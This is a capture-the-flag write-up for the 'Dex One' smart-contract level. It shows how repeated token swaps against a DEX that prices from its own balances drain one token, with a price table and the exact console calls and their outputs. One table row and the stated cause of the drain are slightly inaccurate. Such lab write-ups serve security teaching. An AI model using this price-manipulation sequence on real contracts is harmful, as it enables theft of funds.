# Dex One

# Problem Statement
```
The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
```

**Quick note**<br>
Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, <uint amount>) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.

Things that might help:
- How is the price of the token calculated?
- How does the swap method work?
- How do you approve a transaction of an ERC20?

# Solution
Note that the Solidity doesn't allow for decimals when dividing and only returns the whole number. Because of this the `getSwapPrice` formula here is losing some precision and will return more tokens in the swap:
```
function getSwapPrice(address from, address to, uint amount) public view returns(uint){
  return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}
```

So all we have to do is to swap back and forth until we've drained the pool. Here is a visualization:
```
swap price                me: token1 token2     dex: token1 token2
amt * to / from               10     10              100    100
10 * 100 / 100  =  10          0     20              110     90
20 * 110 /  90  =  24         24      0               86    110
24 * 110 /  86  =  30          0     30              110     80
30 * 110 /  80  =  41         41      0               69    110
41 * 110 /  69  =  65          0     65              110     45
note here 158 is above the dex total of 110 tokens:
65 * 110 /  45  = 158        100      0                0    100
So all we need to do is calculate for 110 tokens:
x * 110 / 45 = 110
x / 45 = 1
x = 45
```

Calls:
```
const t1 = await contract.token1()
const t2 = await contract.token2()
Number(await contract.balanceOf(t1,player))
// returns 10
Number(await contract.balanceOf(t2,player))
// returns 10
Number(await contract.balanceOf(t2,contract.address))
// returns 100
Number(await contract.balanceOf(t1,contract.address))
// returns 100
await contract.approve(contract.address, 200)
await contract.swap(t1,t2,10)
Number(await contract.balanceOf(t1,player))
// returns 0
Number(await contract.balanceOf(t2,player))
// returns 20
await contract.swap(t2,t1,20)
Number(await contract.balanceOf(t1,player))
// returns 24
Number(await contract.balanceOf(t2,player))
// returns 0
await contract.swap(t1,t2,24)
Number(await contract.balanceOf(t1,player))
// returns 0
Number(await contract.balanceOf(t2,player))
// returns 30
await contract.swap(t2,t1,30)
Number(await contract.balanceOf(t1,player))
// returns 41
await contract.swap(t1,t2,41)
Number(await contract.balanceOf(t2,player))
// returns 65
await contract.swap(t2,t1,45)
Number(await contract.balanceOf(t1,player))
// returns 110
```
We've completed this lesson!

# Key Learnings
- solidity divison rounds down to a whole number but you can use modulus `%` to get the remainder
- getting prices or any sort of data from any single source is a possible attack vector in smart contracts
